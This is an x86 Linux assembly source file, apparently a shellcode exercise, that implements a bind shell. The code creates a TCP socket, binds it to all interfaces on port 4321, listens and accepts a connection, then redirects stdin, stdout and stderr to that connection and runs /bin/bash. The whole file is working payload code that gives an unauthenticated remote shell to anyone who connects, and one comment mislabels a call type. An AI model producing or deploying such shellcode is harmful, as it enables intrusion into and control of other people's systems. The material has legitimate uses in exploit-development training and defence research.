global _start			

section .text
_start:

	;References:
	;  1. Syscall header file /usr/include/asm/unistd_32.h
	;  2. http://man7.org/linux/man-pages/man2/

	;I. int socketcall(int call, unsigned long *args);
	;  /usr/include/linux/net.h

	; a. int socket(int domain, int type, int protocol)
	;  /usr/include/(s)- bits/socket.h, bits/socket_type.h,
	;  linux/in.h
	xor eax, eax		;set eax to 0
	xor ebx, ebx		;set ebx to 0
	xor ecx, ecx		;set ecx to 0
	xor edx, edx		;set edx to 0
	mov al, 102		;socketcall() syscall = 102
	mov bl, 1		;call type = 2
	push ecx		;tcp protocol = 0
	push byte 1		;sock_stream = 1
	push byte 2		;PF_INET = 2
	mov ecx, esp		;points to where all arguements are on the stack by esp
	int 0x80		;interupt, everything loaded? eax-check,ebx-check,ecx-check, initiate syscall

	; b. int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	;  build struct sockaddr first
	;  sa_family_t, in_port_t, sin_addr
	mov esi, eax		;save return val into esi
	push edx		;inet_addr = 0.0.0.0
	push word 0xe110	;port = 4321(big endian)-->0xe110(little endian)
	push word 0x2		;sock address family = 2
	mov ecx, esp		;pointer to args in sockaddr struct
	push byte 0x10		;socklen = 16
	push ecx		;push pointer to sockaddr struct
	push esi		;sockfd
	mov ecx,esp		;pointer to bind args
	inc ebx			;call type sys_bind
	mov al, 102		;socketcall() syscall
	int 0x80		;interupt

	; c. int listen(int sockfd, int backlog)
	push edx		;backlog
	push esi		;sockfd
	mov ecx, esp		;pointer to args
	mov bl, 4		;call type sys_listen
	xor eax, eax		;eax set to 0
	mov al, 102		;socketcall() syscall
	int 0x80		;interupt

	; d. int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	mov al, 102		;socketcall() syscall
	inc ebx			;call type sys_accept
	push edx		;addrlen = NULL
	push edx		;addr = NULL
	push esi		;sockfd
	mov ecx, esp		;pointer to sys_accept args
	int 0x80		;interupt

	;II. int dup2(int oldfd, int newfd)
	mov ebx, eax		;return val moved into oldfd
	xor ecx, ecx		;newfd = 0 for stdin
test:				;testing loop for stdout & stderr
	mov al, 0x3f		;syscall for dup2
	int 0x80		;interupt
	inc ecx			;increase ecx for stdout now = 1
	cmp cl, 0x3		;compare ecx
	jne test		;equal? jmp to test if not, don't jmp if true

	;III. int execve(const char *filename, char *const argv[], char *const envp[])
	push edx		;NULL terminator for filename /bin/sh\x00, additionally NULL for char *const envp[]
	push 0x68736162		;hsab pushed onto stack
	push 0x2f2f2f2f		;//// pushed onto stack
	push 0x6e69622f		;nib/ pushed onto stack
	mov ebx, esp		;pointer to filename on stack "/bin////bash"
	xor ecx, ecx		;set char *const argv = NULL
	mov al, 11		;syscall for execve
	int 0x80		;interupt
